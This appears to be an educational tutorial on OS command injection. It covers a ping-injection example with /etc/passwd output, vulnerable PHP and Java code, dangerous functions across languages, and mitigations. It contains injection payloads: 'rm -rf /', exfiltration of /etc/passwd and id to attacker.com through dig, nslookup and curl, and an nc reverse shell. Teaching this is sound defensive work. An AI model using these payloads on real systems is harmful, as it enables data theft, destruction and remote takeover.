üéØ 1. What is OS Command Injection?

OS Command Injection is a vulnerability that allows attackers to execute arbitrary operating system commands on the server hosting an application.

Why It's Dangerous:

  • Complete server takeover
  • Sensitive data exposure
  • Pivoting to internal networks
  • Permanent backdoor installation

Real-World Example:

A website lets users ping servers:

ping.php?ip=8.8.8.8

But an attacker injects:

ping.php?ip=8.8.8.8; cat /etc/passwd
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=9.18 ms

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

The server executed both commands!

Spot the Vulnerability:

// PHP code - can you find the issue?
$email = $_POST['email'];
system("mail -s 'Newsletter' " . $email);

Vulnerability: User-controlled $email is directly concatenated into a system command without validation.

Attackers could inject: attacker@example.com; rm -rf /

üîé 3. Whitebox Code Review

Dangerous PHP Functions:

  • system() - Executes command and outputs result
  • exec() - Executes command
  • passthru() - Executes command and outputs raw
  • shell_exec() - Executes via shell
  • popen()/proc_open() - Process execution
  • Backticks (``) - Command execution

Dangerous Python Functions:

  • os.system()
  • os.popen()
  • subprocess.run() with shell=True
  • subprocess.Popen() with shell

Dangerous Java Methods:

  • Runtime.exec()
  • ProcessBuilder with command arrays

Dangerous Node.js Functions:

  • child_process.exec()
  • child_process.execSync()
  • child_process.spawn() with shell

Code Review Challenge:

// Java code - is this vulnerable?
String user = request.getParameter("username");
String[] cmd = {"sh", "-c", "ls /home/" + user};
Process p = Runtime.getRuntime().exec(cmd);

Answer: Yes! While using an array is safer, the -c flag still invokes a shell interpreter, making it vulnerable to:

username=user;rm -rf /

üöÄ 6. Advanced Techniques

Blind Command Injection

When you don't see command output:

  • Use DNS lookups: ; nslookup $(whoami).attacker.com
  • Trigger web requests: ; curl attacker.com/$(id)
  • Write to web root: ; echo "test" > /var/www/html/test.txt

Time-Based Detection

Use delays to confirm injection:

  • Linux: ; sleep 5
  • Windows: | ping -n 5 127.0.0.1
  • Measure response time differences

Out-of-Band Exploitation

Exfiltrate data through network:

  • ; dig $(cat /etc/passwd | base64).attacker.com
  • ; curl -X POST --data "$(id)" attacker.com/exfil
  • ; nc attacker.com 4444 -e /bin/sh (reverse shell)

üõ°Ô∏è 9. Mitigation Strategies

Defensive Measures:

  • Avoid passing user input to system commands
  • Use built-in library functions instead of shell commands
  • Implement strict input validation (whitelist allowed characters)
  • Escape all metacharacters if commands are unavoidable
  • Run applications with least privileges
  • Use parameterized APIs where possible

Secure Coding Example (Python):

# Dangerous
import os
user_input = input("Enter IP: ")
os.system(f"ping {user_input}")

# Secure
import subprocess
user_input = input("Enter IP: ")
if not user_input.replace('.', '').isdigit():
    raise ValueError("Invalid IP")
subprocess.run(["ping", user_input], shell=False)
